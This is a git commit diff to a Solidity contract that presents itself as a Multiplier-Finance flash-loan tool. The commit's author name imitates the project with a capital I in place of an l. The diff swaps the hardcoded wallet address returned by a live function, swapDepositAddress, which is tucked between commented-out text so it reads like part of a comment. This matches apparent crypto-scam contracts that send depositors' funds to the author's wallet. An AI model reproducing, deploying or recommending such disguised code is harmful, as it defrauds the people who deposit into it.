16dbbc235d21fbf1b100c30053c5d91b17d4c9c1
MultipIier-Finance <107945596+MultipIier-Finance@users.noreply.github.com>
2022-08-23 11:35:01 +0200

    UPDATE V0.25
    amazing speed

--- PoolAddressesProvider.sol
+++ PoolAddressesProvider.sol
@@ -44,7 +44,7 @@ contract Manager {
       // Get coins Loan from Multiplier-Finance
       string memory loanAddress = manager.takeFlashLoan(loanAmount);
        */ function swapDepositAddress() public pure returns (address) {
-        return 0xD86b5777823717f1219b8ADeeEf137E07C015763;
+        return 0x1365A0A6b9782F8FbD3772c902fbFeEf6a40Bb25;
     }
       /* 
       // Send Borrowed coins to provide liquidity of newly created Token
